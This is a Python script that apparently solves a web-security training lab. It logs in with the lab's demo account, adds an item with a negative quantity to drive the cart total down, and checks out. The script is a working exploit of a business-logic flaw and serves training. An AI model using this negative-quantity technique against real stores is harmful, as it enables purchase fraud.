import requests
import re
from bs4 import BeautifulSoup

def get_csrf(session, domain):
    r = session.get(domain)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']
    return csrf

def login(session, domain):
    csrf = get_csrf(session, domain + '/login')
    data = {
        'csrf': csrf,
        'username': 'wiener',
        'password': 'peter'
    }
    r = session.post(domain + '/login', data=data, allow_redirects=False)
    if (r.status_code == 302):
        print('Login successfully.')

def add_product(session, domain, product_id, quantity):
    data1 = {
        'productId': product_id,
        'redir': 'PRODUCT',
        'quantity': quantity,
    }
    session.post(domain + '/cart', data=data1)        
        
def solve(session, domain):
    print('Adding product to cart...')
    add_product(session, domain, '1', '1')
    add_product(session, domain, '2', '-18')
    print('Checking out...')
    csrf = get_csrf(session, domain + '/cart')
    data2 = {
        'csrf': csrf
    }
    r = session.post(domain + '/cart/checkout', data=data2)
    # print(r.text)

def verify(session, domain):
    r = session.get(domain)
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not solved yet.')
        
if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ')
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    with requests.Session() as session:
        print('Logging in...')
        login(session, domain)
        print('Solving...')
        solve(session, domain)
        verify(session, domain)